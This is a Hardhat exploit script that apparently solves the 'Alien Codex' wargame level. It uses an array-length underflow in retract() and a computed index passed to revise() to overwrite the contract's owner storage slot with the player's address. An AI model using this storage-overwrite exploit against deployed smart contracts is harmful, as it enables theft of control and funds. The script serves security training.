import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackAlienCodex = async () => {
    // change contract addresses here.
    const alienCodexAddress = "0xF675Be946818f77Ba00aD069C99C97080800656E";
    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";

    // Don't touch below
    // Exploit comes from no check for underflow on retract function and changing storage value for owner
    // You may read more on:
    // https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
    // https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows
    // https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there
    const ABI = [
        "function make_contact()",
        "function retract()",
        "function revise(uint i, bytes32 _content)",
    ];
    const contract = await ethers.getContractAt(ABI, alienCodexAddress);
    const tx1 = await contract.make_contact();
    const tx1Receipt = await tx1.wait(1);
    console.log(tx1Receipt);
    const tx2 = await contract.retract();
    const tx2Receipt = await tx2.wait(1);
    console.log(tx2Receipt);
    // note here
    const abi = ethers.utils.defaultAbiCoder;
    const params = abi.encode(["uint256"], [1]);
    const position = await ethers.utils.keccak256(params);
    // notes here
    const i = BigInt(2 ** 256) - BigInt(position);
    const _content = "0x" + "0".repeat(24) + playerAddress.slice(2);
    const tx3 = await contract.revise(i, _content);
    const tx3Receipt = await tx3.wait(1);
    console.log(tx3Receipt);
    const pass = (await contract.owner()) === playerAddress;
    console.log(`Claimed ownership and passed this level: ${pass}`);
};

attackAlienCodex()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
